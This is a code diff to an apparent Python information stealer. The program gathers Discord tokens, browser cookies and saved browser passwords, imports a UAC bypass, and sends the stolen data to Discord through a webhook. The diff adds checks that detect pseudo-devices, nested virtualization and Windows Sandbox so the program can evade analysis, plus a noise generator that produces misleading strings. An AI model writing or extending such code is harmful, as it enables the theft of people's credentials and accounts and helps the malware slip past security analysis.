@@ -14,6 +14,10 @@ from Protections.System import SystemChecks
 from Protections.Noise import NoiseGenerator
 from Protections.Biosversion import BIOSVersionChecker
 from Protections.Forbiddenprocess import ForbiddenProcessCheck
+from Protections.Pseudodevices import PseudoDevices
+from Protections.Nestedvirtualization import NestedVirtualizationChecker
+from Protections.Windowssandbox import WindowsSandboxChecker
+
 from Utilities.Webhook import WebhookEncryptor, retrieve_saved_data
 
 from Cores.UAC import UACBypass
@@ -115,14 +119,15 @@ async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
         encryptor.send_data_to_discord(saved_data)
 
 if __name__ == "__main__":
-    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker())
+    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker(), PseudoDevices(), NestedVirtualizationChecker(), WindowsSandboxChecker())
     recovery = Recovery(DiscordTokenRecovery(), CookieRecovery(), BrowserPasswordRecovery())
     noise_methods = [
         NoiseGenerator.create_noise, 
         NoiseGenerator.create_alternate_noise, 
         NoiseGenerator.random_string_generator, 
         NoiseGenerator.math_noise, 
-        NoiseGenerator.activity_simulation
+        NoiseGenerator.activity_simulation,
+        NoiseGenerator.misleading_string_generator
     ]
     task_manager = TaskManager(checks, recovery, noise_methods)
     
